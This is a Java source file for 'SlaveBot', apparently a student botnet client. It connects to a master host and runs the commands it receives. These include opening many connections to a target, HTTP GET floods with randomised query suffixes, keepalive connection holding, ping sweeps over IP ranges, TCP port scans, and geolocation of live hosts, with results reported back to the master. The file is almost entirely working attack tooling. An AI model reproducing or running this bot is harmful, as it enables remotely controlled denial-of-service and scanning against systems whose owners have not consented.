//package com.company;


import com.sun.org.apache.regexp.internal.RE;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.*;
import java.net.*;
import java.util.concurrent.*;

/**
 * Created by bing on 3/4/17.
 */

public class SlaveBot {
    private static Socket socketMaster = new Socket();
    private static PrintWriter outMaster = null;
    private static BufferedReader inMaster = null;
    private static String masterHost = null;
    private static int masterPort = 0;
    static Map<String, Socket> connectionMap = new HashMap<>();

    public static void main(String[] args) throws IOException {
        if (args.length == 3) {
            if (args[0].equals("-h")) {
                try {
                    connectMaster(args[1], Integer.parseInt(args[2]));
                } catch (NumberFormatException e) {
                    System.out.println("Please input a number as a third argument to indicate which port to connect! \n >");
                    e.printStackTrace();
                    System.exit(1);
                }
            } else {
                System.out.println("Wrong command, should start with \"-h\"! \n >");
                System.exit(1);
            }
        } else {
            System.out.println("Wrong number of arguments \n>");
            System.exit(1);
        }
    }

    static void connectMaster(String masterhost, int masterport) throws IOException {
        masterHost = masterhost;
        masterPort = masterport;
        socketMaster.connect(new InetSocketAddress(masterHost, masterPort));
        socketMaster.setKeepAlive(true);
        outMaster = new PrintWriter(socketMaster.getOutputStream(), true);
        inMaster = new BufferedReader(new InputStreamReader(socketMaster.getInputStream()));
        System.out.print(">Connect to Master! \n>");

        String input;
        while ((input = inMaster.readLine()) != null) {
            System.out.println("Received from master: \"" + input + "\"");
            if (input.startsWith("disconnect")) {
                disconnect(input);
            }
            if (input.startsWith("connect")) {
                connect(input);
            }
            if (input.startsWith("geoipscan")) {
                System.out.println(geoipscan(input));
                outMaster.println(geoipscan(input));
            }
            if (input.startsWith("ipscan")) {
                System.out.println(ipscan(input));
                outMaster.println(ipscan(input));
            }
            if (input.startsWith("tcpportscan")) {
                System.out.println(tcpportscan(input));
                outMaster.println(tcpportscan(input));
            }
        }
    }

    static void connect(String input) throws IOException {
        String[] inputs = input.split(" ");
        String targetHost = inputs[2];
        int count = inputs.length;
        int port = Integer.parseInt(inputs[3]);
        Socket socketHost;

        socketHost = new Socket();
        socketHost.connect(new InetSocketAddress(targetHost, port));
        String key = inputs[2] + "-" + inputs[3];
        connectionMap.put(key, socketHost);
        System.out.print("Connected via " + socketHost.getLocalSocketAddress().toString().replaceAll("/", "") + "\n>");

        if (count == 5) {
            try {
                int numberOfConnections = Integer.parseInt(inputs[4]);
                for (int i = 0; i < (numberOfConnections - 1); i++) {
                    socketHost = new Socket();
                    socketHost.connect(new InetSocketAddress(targetHost, port));
                    System.out.print("Connected via " + socketHost.getLocalSocketAddress().toString().replaceAll("/", "") + "\n>");
                }
            } catch (NumberFormatException e) {
                if (inputs[4].equals("keepalive")) {
                    socketHost.setKeepAlive(true);
                    System.out.print("--Connection is kept alive" + "\n>");
                }
                if (inputs[4].startsWith("/")) {
                    String path = inputs[4];
                    if (path.endsWith("=")) {
                        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                        Random rLength = new Random();
                        Random rString = new Random();
                        int length = rLength.nextInt(10) + 1;
                        char[] text = new char[length];
                        for (int i = 0; i < length; i++) {
                            text[i] = characters.charAt(rString.nextInt(characters.length()));
                        }
                        path = path + new String(text);
                    }

                    PrintWriter wtr = new PrintWriter(socketHost.getOutputStream());
                    wtr.println("GET " + path + " HTTP/1.1");
                    wtr.println("Host: " + targetHost);
                    wtr.println("");
                    wtr.flush();
                    System.out.print("--Request http://" + targetHost + path + "\n");
                    BufferedReader br = new BufferedReader(new InputStreamReader(socketHost.getInputStream()));
                    String t;
                    System.out.print("Server's responses are as follows:" + "\n");
                    for (int s = 0; s < 5; s++) {
                        t = br.readLine();
                        System.out.println(t);
                    }
                    wtr.close();
                    System.out.println("...");
                    System.out.println("...");
                    System.out.println("...(Only the first five lines of responses are displayed)");
                    System.out.print("\n>");
                }
            }
        } else {
            int numberOfConnections = Integer.parseInt(inputs[4]);
            if (inputs[5].equals("keepalive")) {
                socketHost.setKeepAlive(true);
                System.out.print("--Connection is kept alive" + "\n>");
            }
            if (inputs[5].startsWith("/")) {
                String path = inputs[5];
                if (path.endsWith("=")) {
                    String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    Random rLength = new Random();
                    Random rString = new Random();
                    int length = rLength.nextInt(10) + 1;
                    char[] text = new char[length];
                    for (int j = 0; j < length; j++) {
                        text[j] = characters.charAt(rString.nextInt(characters.length()));
                    }
                    path = path + new String(text);
                }

                PrintWriter wtr = new PrintWriter(socketHost.getOutputStream());
                wtr.println("GET " + path + " HTTP/1.1");
                wtr.println("Host: " + targetHost);
                wtr.println("");
                wtr.flush();
                System.out.print("--Request http://" + targetHost + path + "\n");
                BufferedReader br = new BufferedReader(new InputStreamReader(socketHost.getInputStream()));
                String t;
                System.out.print("Server's responses are as follows:" + "\n");
                for (int s = 0; s < 5; s++) {
                    t = br.readLine();
                    System.out.println(t);
                }
                wtr.close();
                System.out.println("...");
                System.out.println("...");
                System.out.println("...(Only the first five lines of responses are displayed)");
                System.out.print("\n>");
            }

            for (int i = 0; i < (numberOfConnections - 1); i++) {
                socketHost = new Socket();
                socketHost.connect(new InetSocketAddress(targetHost, port));
                System.out.print("Connected via " + socketHost.getLocalSocketAddress().toString().replaceAll("/", "") + "\n>");

                if (inputs[5].equals("keepalive")) {
                    socketHost.setKeepAlive(true);
                    System.out.print("--Connection is kept alive" + "\n>");
                }
                if (inputs[5].startsWith("/")) {
                    String path = inputs[5];
                    if (path.endsWith("=")) {
                        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                        Random rLength = new Random();
                        Random rString = new Random();
                        int length = rLength.nextInt(10) + 1;
                        char[] text = new char[length];
                        for (int j = 0; j < length; j++) {
                            text[j] = characters.charAt(rString.nextInt(characters.length()));
                        }
                        path = path + new String(text);
                    }

                    PrintWriter wtr = new PrintWriter(socketHost.getOutputStream());
                    wtr.println("GET " + path + " HTTP/1.1");
                    wtr.println("Host: " + targetHost);
                    wtr.println("");
                    wtr.flush();
                    System.out.print("--Request http://" + targetHost + path + "\n");
                    BufferedReader br = new BufferedReader(new InputStreamReader(socketHost.getInputStream()));
                    String t;
                    System.out.print("Server's responses are as follows:" + "\n");
                    for (int s = 0; s < 5; s++) {
                        t = br.readLine();
                        System.out.println(t);
                    }
                    wtr.close();
                    System.out.println("...");
                    System.out.println("...");
                    System.out.println("...(Only the first five lines of responses are displayed)");
                    System.out.print("\n>");
                }
            }
        }
    }

    static void disconnect(String input) {
        String[] inputs = input.split(" ");
        String host = inputs[2];
        String socketKey = new String();
        int count = inputs.length;

        if (count == 4) {
            int port = Integer.valueOf(inputs[3]);
            socketKey = host + port;
            try {
                System.out.print("Disconnect from host " + socketKey + "\n");
                connectionMap.get(socketKey).close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else if (count == 3) {
            for (String key : connectionMap.keySet()) {
                if (!key.startsWith(host)) {
                    continue;
                }
                try {
                    System.out.print("Disconnect from host " + key + "\n");
                    connectionMap.get(key).close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    static String ipscan(String input) throws IOException {
        String[] inputs = input.split(" ");
        String Result = new String();
        Map<String, Future<Boolean>> ipMap = new HashMap<>();
        final ExecutorService es = Executors.newFixedThreadPool(20);
        for (String key : ipParser(inputs[2]).keySet()) {
            ipMap.put(key, ipMapper(es, key));
        }
        for (Map.Entry<String, Future<Boolean>> entry : ipMap.entrySet()) {
            try {
                if (entry.getValue().get()) {
                    if (!Result.isEmpty()) {
                        Result += ", " + entry.getKey();
                    } else {
                        Result += entry.getKey();
                    }
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            }
        }
        es.shutdown();
        return Result;
    }

    static String tcpportscan(String input) {
        final ExecutorService es = Executors.newFixedThreadPool(20);
        String[] inputs = input.split(" ");
        String targetHost = inputs[2];
        String[] portRange = inputs[3].split("-");
        Map<String, Future<Boolean>> portMap = new HashMap<>();
        int portLower = Integer.parseInt(portRange[0]);
        int portHigher = Integer.parseInt(portRange[1]);
        String Result = new String();
        int i;
        for (i = portLower; i <= portHigher; i++) {
            portMap.put(Integer.toString(i), portMapper(es, targetHost, i));
        }

        for (Map.Entry<String, Future<Boolean>> entry : portMap.entrySet()) {
            try {
                if (entry.getValue().get()) {
                    if (!Result.isEmpty()) {
                        Result += ", " + entry.getKey();
                    } else {
                        Result += entry.getKey();
                    }
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            }
        }
        es.shutdown();
        return Result;
    }

    static String geoipscan(String input) throws IOException {
        String[] inputs = input.split(" ");
        String Result = new String();
        Map<String, Future<Boolean>> ipMap = new HashMap<>();
        final ExecutorService es = Executors.newFixedThreadPool(20);
        for (String key : ipParser(inputs[2]).keySet()) {
            ipMap.put(key, ipMapper(es, key));
        }
        for (Map.Entry<String, Future<Boolean>> entry : ipMap.entrySet()) {
            try {
                if (entry.getValue().get()) {
                        Result += entry.getKey() + geo(entry.getKey()) +"\n";
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            }
        }
        es.shutdown();
        return Result;
    }

    public static Future<Boolean> portMapper(final ExecutorService es, final String ip, final int port) {
        return es.submit(new Callable<Boolean>() {
            @Override
            public Boolean call() {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(InetAddress.getByName(ip), port), 300);
                    socket.close();
                    return true;
                } catch (Exception ex) {
                    return false;
                }
            }
        });
    }

    public static Future<Boolean> ipMapper(final ExecutorService es, final String ip) {
        return es.submit(new Callable<Boolean>() {
            @Override
            public Boolean call() throws IOException {
//                InetAddress inet = InetAddress.getByName(ip);
//                return inet.isReachable(5000);

                boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
                boolean isReachable = false;
                try {
                    ProcessBuilder processBuilder = new ProcessBuilder("ping", isWindows ? "-n" : "-c", "1", ip);
                    Process proc = processBuilder.start();
                    boolean exitValue = proc.waitFor(5, TimeUnit.SECONDS);
                    if (exitValue == true)
                        isReachable = true;
                } catch (IOException e1) {
                    System.out.println(e1.getMessage());
                    e1.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                return isReachable;
            }
        });
    }

    static Map<String, Boolean> ipParser(String input) {
        Map<String, Boolean> ipMap = new HashMap<>();
        String[] ipRange = input.split("-");
        String[] ipTuplesBeg = ipRange[0].split("\\.");
        String[] ipTuplesEnd = ipRange[1].split("\\.");
        int seg1Lower = Integer.parseInt(ipTuplesBeg[0]);
        int seg1Upper = Integer.parseInt(ipTuplesEnd[0]);
        int seg2Lower = Integer.parseInt(ipTuplesBeg[1]);
        int seg2Upper = Integer.parseInt(ipTuplesEnd[1]);
        int seg3Lower = Integer.parseInt(ipTuplesBeg[2]);
        int seg3Upper = Integer.parseInt(ipTuplesEnd[2]);
        int seg4Lower = Integer.parseInt(ipTuplesBeg[3]);
        int seg4Upper = Integer.parseInt(ipTuplesEnd[3]);
        for (int i = seg1Lower; i <= seg1Upper; i++) {
            for (int j = seg2Lower; j <= seg2Upper; j++) {
                for (int k = seg3Lower; k <= seg3Upper; k++) {
                    for (int l = seg4Lower; l <= seg4Upper; l++) {
                        ipMap.put(i + "." + j + "." + k + "." + l, false);
                    }
                }
            }
        }
        return ipMap;
    }

    static String geo(String input) {
        String Result = new String();
        String urlString = "http://ip-api.com/line/" + input;
        try {
            URL ipCheckUrl = new URL(urlString);
            URLConnection ipCheckConnection = ipCheckUrl.openConnection();
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(
                            ipCheckConnection.getInputStream()));
            String inputLine;
            int i = 1;
            while ((inputLine = in.readLine()) != null) {
                if(i==1 && !inputLine.equals("success")){
                    break;
                }
                if(i==2){
                   Result += "Country: " + inputLine +"; ";
                }
                if(i==5){
                    Result += "State: " + inputLine +"; ";
                }
                if(i==6){
                    Result += "City: " + inputLine +"; ";
                }
                if(i==7){
                    Result += "Zip Code: " + inputLine;
                    break;
                }
                i++;
            }
            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Result;
    }
}